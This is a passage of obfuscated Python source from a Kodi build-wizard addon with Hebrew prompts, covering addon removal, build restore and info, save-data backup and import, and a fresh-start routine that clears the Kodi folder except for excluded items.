			if O00OOO0O00O0OOO0O ==ACTION_PREVIOUS_MENU :OO0OOO00O0OO00OOO .close ()#line:4640
			elif O00OOO0O00O0OOO0O ==ACTION_NAV_BACK :OO0OOO00O0OO00OOO .close ()#line:4641
	if default ==None :default =wiz .Grab_Log (True )#line:4642
	OO0O000OOOO00O0O0 =OOO000OOOOO0OO00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4643
	OO0O000OOOO00O0O0 .doModal ()#line:4644
	del OO0O000OOOO00O0O0 #line:4645
def removeAddon (O00000O0O0O000O00 ,O00OOOO0OO0OOO000 ,over =False ):#line:4647
	if not over ==False :#line:4648
		OOOOOOOOO000OO00O =1 #line:4649
	else :#line:4650
		OOOOOOOOO000OO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OOOO0OO0OOO000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00000O0O0O000O00 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4651
	if OOOOOOOOO000OO00O ==1 :#line:4652
		O00OOOOO0O00OO0OO =os .path .join (ADDONS ,O00000O0O0O000O00 )#line:4653
		wiz .log ("Removing Addon %s"%O00000O0O0O000O00 )#line:4654
		wiz .cleanHouse (O00OOOOO0O00OO0OO )#line:4655
		xbmc .sleep (1000 )#line:4656
		try :shutil .rmtree (O00OOOOO0O00OO0OO )#line:4657
		except Exception as O0000OO0O00OOOOOO :wiz .log ("Error removing %s"%O00000O0O0O000O00 ,xbmc .LOGNOTICE )#line:4658
		removeAddonData (O00000O0O0O000O00 ,O00OOOO0OO0OOO000 ,over )#line:4659
	if over ==False :#line:4660
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00OOOO0OO0OOO000 ))#line:4661
def removeAddonData (OO0OO000OOO0O000O ,name =None ,over =False ):#line:4663
	if OO0OO000OOO0O000O =='all':#line:4664
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4665
			wiz .cleanHouse (ADDOND )#line:4666
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4667
	elif OO0OO000OOO0O000O =='uninstalled':#line:4668
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4669
			O0OOOOOOOO0OO0OOO =0 #line:4670
			for O0O0O00O0000O0O00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4671
				OO00OOO00OOOOOOOO =O0O0O00O0000O0O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4672
				if OO00OOO00OOOOOOOO in EXCLUDES :pass #line:4673
				elif os .path .exists (os .path .join (ADDONS ,OO00OOO00OOOOOOOO )):pass #line:4674
				else :wiz .cleanHouse (O0O0O00O0000O0O00 );O0OOOOOOOO0OO0OOO +=1 ;wiz .log (O0O0O00O0000O0O00 );shutil .rmtree (O0O0O00O0000O0O00 )#line:4675
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOOOOOOO0OO0OOO ))#line:4676
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4677
	elif OO0OO000OOO0O000O =='empty':#line:4678
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4679
			O0OOOOOOOO0OO0OOO =wiz .emptyfolder (ADDOND )#line:4680
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOOOOOOO0OO0OOO ))#line:4681
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4682
	else :#line:4683
		O0O000O0OOO0000OO =os .path .join (USERDATA ,'addon_data',OO0OO000OOO0O000O )#line:4684
		if OO0OO000OOO0O000O in EXCLUDES :#line:4685
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4686
		elif os .path .exists (O0O000O0OOO0000OO ):#line:4687
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO000OOO0O000O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4688
				wiz .cleanHouse (O0O000O0OOO0000OO )#line:4689
				try :#line:4690
					shutil .rmtree (O0O000O0OOO0000OO )#line:4691
				except :#line:4692
					wiz .log ("Error deleting: %s"%O0O000O0OOO0000OO )#line:4693
			else :#line:4694
				wiz .log ('Addon data for %s was not removed'%OO0OO000OOO0O000O )#line:4695
	wiz .refresh ()#line:4696
def restoreit (O00O00O00000OOO0O ):#line:4698
	if O00O00O00000OOO0O =='build':#line:4699
		O0O0O000OO0OO000O =freshStart ('restore')#line:4700
		if O0O0O000OO0OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4701
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4702
		wiz .skinToDefault ()#line:4703
	wiz .restoreLocal (O00O00O00000OOO0O )#line:4704
def restoreextit (OOOOO0O0OO0OOO00O ):#line:4706
	if OOOOO0O0OO0OOO00O =='build':#line:4707
		OO0OO0O0OOOO00OO0 =freshStart ('restore')#line:4708
		if OO0OO0O0OOOO00OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4709
	wiz .restoreExternal (OOOOO0O0OO0OOO00O )#line:4710
def buildInfo (O00O0O0OOO0O000OO ):#line:4712
	if wiz .workingURL (SPEEDFILE )==True :#line:4713
		if wiz .checkBuild (O00O0O0OOO0O000OO ,'url'):#line:4714
			O00O0O0OOO0O000OO ,O000OOOOOOO00OO00 ,O0O0O0OOO0O00OO00 ,OO000OOOOOOOO000O ,OOO000OO0O00OOOO0 ,OO00OOOO0O000O000 ,O0OO0O00OO00000O0 ,OO0O000OO0OO00OO0 ,OO0O0O00O00O0O000 ,OO000O000OO0OO0OO ,OOO000OOOO000O000 =wiz .checkBuild (O00O0O0OOO0O000OO ,'all')#line:4715
			OO000O000OO0OO0OO ='Yes'if OO000O000OO0OO0OO .lower ()=='yes'else 'No'#line:4716
			O0000O0000OO00000 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0O0OOO0O000OO )#line:4717
			O0000O0000OO00000 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OOOOOOO00OO00 )#line:4718
			if not OO00OOOO0O000O000 =="http://":#line:4719
				O00OOO000O000O00O =wiz .themeCount (O00O0O0OOO0O000OO ,False )#line:4720
				O0000O0000OO00000 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00OOO000O000O00O ))#line:4721
			O0000O0000OO00000 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000OO0O00OOOO0 )#line:4722
			O0000O0000OO00000 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000O000OO0OO0OO )#line:4723
			O0000O0000OO00000 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000OOOO000O000 )#line:4724
			wiz .TextBox (ADDONTITLE ,O0000O0000OO00000 )#line:4725
		else :wiz .log ("Invalid Build Name!")#line:4726
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4727
def buildVideo (OO0O00O0OO00O000O ):#line:4729
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4730
	if wiz .workingURL (SPEEDFILE )==True :#line:4731
		O00O00OO0OO000O00 =wiz .checkBuild (OO0O00O0OO00O000O ,'preview')#line:4732
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0O00O0OO00O000O )#line:4733
		if O00O00OO0OO000O00 and not O00O00OO0OO000O00 =='http://':playVideo (O00O00OO0OO000O00 )#line:4734
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0O00O0OO00O000O )#line:4735
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4736
def dependsList (OOO0O0OOO0O0OOOOO ):#line:4738
	O00OOO0O0O0O000OO =os .path .join (ADDONS ,OOO0O0OOO0O0OOOOO ,'addon.xml')#line:4739
	if os .path .exists (O00OOO0O0O0O000OO ):#line:4740
		OOO00OOO0O0OOOOOO =open (O00OOO0O0O0O000OO ,mode ='r');OOOO000OO00O0000O =OOO00OOO0O0OOOOOO .read ();OOO00OOO0O0OOOOOO .close ();#line:4741
		O0OOO00OO0O0OO0O0 =wiz .parseDOM (OOOO000OO00O0000O ,'import',ret ='addon')#line:4742
		OO0OO0O0O000000O0 =[]#line:4743
		for O00OOOO00OOOO0O00 in O0OOO00OO0O0OO0O0 :#line:4744
			if not 'xbmc.python'in O00OOOO00OOOO0O00 :#line:4745
				OO0OO0O0O000000O0 .append (O00OOOO00OOOO0O00 )#line:4746
		return OO0OO0O0O000000O0 #line:4747
	return []#line:4748
def manageSaveData (O000OOO000O00000O ):#line:4750
	if O000OOO000O00000O =='import':#line:4751
		OOOO00O00O00OO0O0 =os .path .join (ADDONDATA ,'temp')#line:4752
		if not os .path .exists (OOOO00O00O00OO0O0 ):os .makedirs (OOOO00O00O00OO0O0 )#line:4753
		OOO0O0O00OOO000OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4754
		if not OOO0O0O00OOO000OO .endswith ('.zip'):#line:4755
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4756
			return #line:4757
		O000O0OOOOOO0OOOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4758
		O0O0OOO0000O00OO0 =xbmcvfs .copy (OOO0O0O00OOO000OO ,O000O0OOOOOO0OOOO )#line:4759
		wiz .log ("%s"%str (O0O0OOO0000O00OO0 ))#line:4760
		extract .all (xbmc .translatePath (O000O0OOOOOO0OOOO ),OOOO00O00O00OO0O0 )#line:4761
		OO0O00000000000O0 =os .path .join (OOOO00O00O00OO0O0 ,'trakt')#line:4762
		OOO0OOO000OO0O00O =os .path .join (OOOO00O00O00OO0O0 ,'login')#line:4763
		OOO0000OOOO0O0000 =os .path .join (OOOO00O00O00OO0O0 ,'debrid')#line:4764
		OOOOO00O0000O00OO =0 #line:4765
		if os .path .exists (OO0O00000000000O0 ):#line:4766
			OOOOO00O0000O00OO +=1 #line:4767
			OO0O0O00OOO00O0OO =os .listdir (OO0O00000000000O0 )#line:4768
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4769
			for OO0O00OO00O0000OO in OO0O0O00OOO00O0OO :#line:4770
				OOO0OO0O0O0O0O000 =os .path .join (traktit .TRAKTFOLD ,OO0O00OO00O0000OO )#line:4771
				OO000O0OO000O0OO0 =os .path .join (OO0O00000000000O0 ,OO0O00OO00O0000OO )#line:4772
				if os .path .exists (OOO0OO0O0O0O0O000 ):#line:4773
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OO00O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4774
					else :os .remove (OOO0OO0O0O0O0O000 )#line:4775
				shutil .copy (OO000O0OO000O0OO0 ,OOO0OO0O0O0O0O000 )#line:4776
			traktit .importlist ('all')#line:4777
			traktit .traktIt ('restore','all')#line:4778
		if os .path .exists (OOO0OOO000OO0O00O ):#line:4779
			OOOOO00O0000O00OO +=1 #line:4780
			OO0O0O00OOO00O0OO =os .listdir (OOO0OOO000OO0O00O )#line:4781
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4782
			for OO0O00OO00O0000OO in OO0O0O00OOO00O0OO :#line:4783
				OOO0OO0O0O0O0O000 =os .path .join (loginit .LOGINFOLD ,OO0O00OO00O0000OO )#line:4784
				OO000O0OO000O0OO0 =os .path .join (OOO0OOO000OO0O00O ,OO0O00OO00O0000OO )#line:4785
				if os .path .exists (OOO0OO0O0O0O0O000 ):#line:4786
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OO00O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4787
					else :os .remove (OOO0OO0O0O0O0O000 )#line:4788
				shutil .copy (OO000O0OO000O0OO0 ,OOO0OO0O0O0O0O000 )#line:4789
			loginit .importlist ('all')#line:4790
			loginit .loginIt ('restore','all')#line:4791
		if os .path .exists (OOO0000OOOO0O0000 ):#line:4792
			OOOOO00O0000O00OO +=1 #line:4793
			OO0O0O00OOO00O0OO =os .listdir (OOO0000OOOO0O0000 )#line:4794
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4795
			for OO0O00OO00O0000OO in OO0O0O00OOO00O0OO :#line:4796
				OOO0OO0O0O0O0O000 =os .path .join (debridit .REALFOLD ,OO0O00OO00O0000OO )#line:4797
				OO000O0OO000O0OO0 =os .path .join (OOO0000OOOO0O0000 ,OO0O00OO00O0000OO )#line:4798
				if os .path .exists (OOO0OO0O0O0O0O000 ):#line:4799
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OO00O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4800
					else :os .remove (OOO0OO0O0O0O0O000 )#line:4801
				shutil .copy (OO000O0OO000O0OO0 ,OOO0OO0O0O0O0O000 )#line:4802
			debridit .importlist ('all')#line:4803
			debridit .debridIt ('restore','all')#line:4804
		wiz .cleanHouse (OOOO00O00O00OO0O0 )#line:4805
		wiz .removeFolder (OOOO00O00O00OO0O0 )#line:4806
		os .remove (O000O0OOOOOO0OOOO )#line:4807
		if OOOOO00O0000O00OO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4808
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4809
	elif O000OOO000O00000O =='export':#line:4810
		OO0OO000OOO0OOO00 =xbmc .translatePath (MYBUILDS )#line:4811
		O000O0O0OOOO0O000 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4812
		traktit .traktIt ('update','all')#line:4813
		loginit .loginIt ('update','all')#line:4814
		debridit .debridIt ('update','all')#line:4815
		OOO0O0O00OOO000OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4816
		OOO0O0O00OOO000OO =xbmc .translatePath (OOO0O0O00OOO000OO )#line:4817
		OOO0O0O0O00OOOO00 =os .path .join (OO0OO000OOO0OOO00 ,'SaveData.zip')#line:4818
		OOO0O00O00000000O =zipfile .ZipFile (OOO0O0O0O00OOOO00 ,mode ='w')#line:4819
		for OOOOOOO00O0OO0OO0 in O000O0O0OOOO0O000 :#line:4820
			if os .path .exists (OOOOOOO00O0OO0OO0 ):#line:4821
				OO0O0O00OOO00O0OO =os .listdir (OOOOOOO00O0OO0OO0 )#line:4822
				for O0000O0000O0O0O0O in OO0O0O00OOO00O0OO :#line:4823
					OOO0O00O00000000O .write (os .path .join (OOOOOOO00O0OO0OO0 ,O0000O0000O0O0O0O ),os .path .join (OOOOOOO00O0OO0OO0 ,O0000O0000O0O0O0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4824
		OOO0O00O00000000O .close ()#line:4825
		if OOO0O0O00OOO000OO ==OO0OO000OOO0OOO00 :#line:4826
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O0O0O00OOOO00 ))#line:4827
		else :#line:4828
			try :#line:4829
				xbmcvfs .copy (OOO0O0O0O00OOOO00 ,os .path .join (OOO0O0O00OOO000OO ,'SaveData.zip'))#line:4830
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO0O0O00OOO000OO ,'SaveData.zip')))#line:4831
			except :#line:4832
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O0O0O00OOOO00 ))#line:4833
def freshStart (install =None ,over =False ):#line:4838
	if USERNAME =='':#line:4839
		ADDON .openSettings ()#line:4840
		sys .exit ()#line:4841
	OOOOOO000O0OO00O0 =(SPEEDFILE )#line:4842
	(OOOOOO000O0OO00O0 )#line:4843
	O00O0O00OOO0OO0O0 =(wiz .workingURL (OOOOOO000O0OO00O0 ))#line:4844
	(O00O0O00OOO0OO0O0 )#line:4845
	if KEEPTRAKT =='true':#line:4846
		traktit .autoUpdate ('all')#line:4847
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4848
	if KEEPREAL =='true':#line:4849
		debridit .autoUpdate ('all')#line:4850
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4851
	if KEEPLOGIN =='true':#line:4852
		loginit .autoUpdate ('all')#line:4853
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4854
	if over ==True :OOO000000O000OO0O =1 #line:4855
	elif install =='restore':OOO000000O000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4856
	elif install :OOO000000O000OO0O =1 #line:4857
	else :OOO000000O000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4858
	if OOO000000O000OO0O :#line:4859
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4860
			O00OO00O000O0000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4861
			skinSwitch .swapSkins (O00OO00O000O0000O )#line:4864
			O0OO0O00000OOOO0O =0 #line:4865
			xbmc .sleep (1000 )#line:4866
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO0O00000OOOO0O <150 :#line:4867
				O0OO0O00000OOOO0O +=1 #line:4868
				xbmc .sleep (1000 )#line:4869
				wiz .ebi ('SendAction(Select)')#line:4870
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4871
				wiz .ebi ('SendClick(11)')#line:4872
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4873
			xbmc .sleep (1000 )#line:4874
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4875
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4876
			return #line:4877
		wiz .addonUpdates ('set')#line:4878
		O0OOO0OOOOOO0O0O0 =os .path .abspath (HOME )#line:4879
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4880
		OO0O0O0O0OO0O000O =sum ([len (OOO0O0000O000OO0O )for OO00O00O0OOO0O000 ,O0O000OOO0000O00O ,OOO0O0000O000OO0O in os .walk (O0OOO0OOOOOO0O0O0 )]);O000OO00OO00OO00O =0 #line:4881
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4882
		EXCLUDES .append ('My_Builds')#line:4883
		EXCLUDES .append ('archive_cache')#line:4884
		EXCLUDES .append ('script.module.requests')#line:4885
		EXCLUDES .append ('myfav.anon')#line:4886
		if KEEPREPOS =='true':#line:4887
			OO0O00OO0OO0OO0O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4888
			for O0OO00OOO0O00O00O in OO0O00OO0OO0OO0O0 :#line:4889
				O0O00O0O0O00O0000 =os .path .split (O0OO00OOO0O00O00O [:-1 ])[1 ]#line:4890
				if not O0O00O0O0O00O0000 ==EXCLUDES :#line:4891
					EXCLUDES .append (O0O00O0O0O00O0000 )#line:4892
		if KEEPSUPER =='true':#line:4893
			EXCLUDES .append ('plugin.program.super.favourites')#line:4894
		if KEEPMOVIELIST =='true':#line:4895
			EXCLUDES .append ('plugin.video.metalliq')#line:4896
		if KEEPMOVIELIST =='true':#line:4897
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4898
		if KEEPADDONS =='true':#line:4899
			EXCLUDES .append ('addons')#line:4900
		if KEEPTELEMEDIA =='true':#line:4901
			EXCLUDES .append ('plugin.video.telemedia')#line:4902
		EXCLUDES .append ('plugin.video.elementum')#line:4907
		EXCLUDES .append ('script.elementum.burst')#line:4908
		EXCLUDES .append ('script.elementum.burst-master')#line:4909
		EXCLUDES .append ('plugin.video.quasar')#line:4910
		EXCLUDES .append ('script.quasar.burst')#line:4911
		EXCLUDES .append ('skin.estuary')#line:4912
		if KEEPWHITELIST =='true':#line:4915
			O0OOOO00OO0000OO0 =''#line:4916
			O000O0O0O0OO0O00O =wiz .whiteList ('read')#line:4917
			if len (O000O0O0O0OO0O00O )>0 :#line:4918
				for O0OO00OOO0O00O00O in O000O0O0O0OO0O00O :#line:4919
					try :OO00O00OOO00OOO00 ,OO000O00OOO00OO00 ,O0000O00000OOO00O =O0OO00OOO0O00O00O #line:4920
					except :pass #line:4921
					if O0000O00000OOO00O .startswith ('pvr'):O0OOOO00OO0000OO0 =OO000O00OOO00OO00 #line:4922
					OO00O0O0O000OOOO0 =dependsList (O0000O00000OOO00O )#line:4923
					for O000OOOOOOO0000O0 in OO00O0O0O000OOOO0 :#line:4924
						if not O000OOOOOOO0000O0 in EXCLUDES :#line:4925
							EXCLUDES .append (O000OOOOOOO0000O0 )#line:4926
						OOO0O0OO00O000O00 =dependsList (O000OOOOOOO0000O0 )#line:4927
						for O0OO00OOO0OOO0OOO in OOO0O0OO00O000O00 :#line:4928
							if not O0OO00OOO0OOO0OOO in EXCLUDES :#line:4929
								EXCLUDES .append (O0OO00OOO0OOO0OOO )#line:4930
					if not O0000O00000OOO00O in EXCLUDES :#line:4931
						EXCLUDES .append (O0000O00000OOO00O )#line:4932
				if not O0OOOO00OO0000OO0 =='':wiz .setS ('pvrclient',O0000O00000OOO00O )#line:4933
		if wiz .getS ('pvrclient')=='':#line:4934
			for O0OO00OOO0O00O00O in EXCLUDES :#line:4935
				if O0OO00OOO0O00O00O .startswith ('pvr'):#line:4936
					wiz .setS ('pvrclient',O0OO00OOO0O00O00O )#line:4937
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4938
		OOOO0OO0O000000OO =wiz .latestDB ('Addons')#line:4939
		for O0OOO0O0OOOO000OO ,OO0O00OOOOOOO00OO ,O0OOO000OOO0OO000 in os .walk (O0OOO0OOOOOO0O0O0 ,topdown =True ):#line:4940
			OO0O00OOOOOOO00OO [:]=[O000000OOO00O0O00 for O000000OOO00O0O00 in OO0O00OOOOOOO00OO if O000000OOO00O0O00 not in EXCLUDES ]#line:4941
			for OO00O00OOO00OOO00 in O0OOO000OOO0OO000 :#line:4942
				O000OO00OO00OO00O +=1 #line:4943
				O0000O00000OOO00O =O0OOO0O0OOOO000OO .replace ('/','\\').split ('\\')#line:4944
				O0OO0O00000OOOO0O =len (O0000O00000OOO00O )-1 #line:4946
				if O0000O00000OOO00O [O0OO0O00000OOOO0O -2 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O00000OOO00O [O0OO0O00000OOOO0O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4947
				elif OO00O00OOO00OOO00 =='MyVideos99.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4948
				elif OO00O00OOO00OOO00 =='MyVideos107.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4949
				elif OO00O00OOO00OOO00 =='MyVideos116.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4950
				elif OO00O00OOO00OOO00 =='MyVideos99.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4951
				elif OO00O00OOO00OOO00 =='MyVideos107.db'and O0000O00000OOO00O [O0OO0O00000OOOO0O -1 ]=='userdata'and O0000O00000OOO00O [O0OO0O00000OOOO0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0O0OOOO000OO ,OO00O00OOO00OOO00 ),xbmc .LOGNOTICE )#line:4952
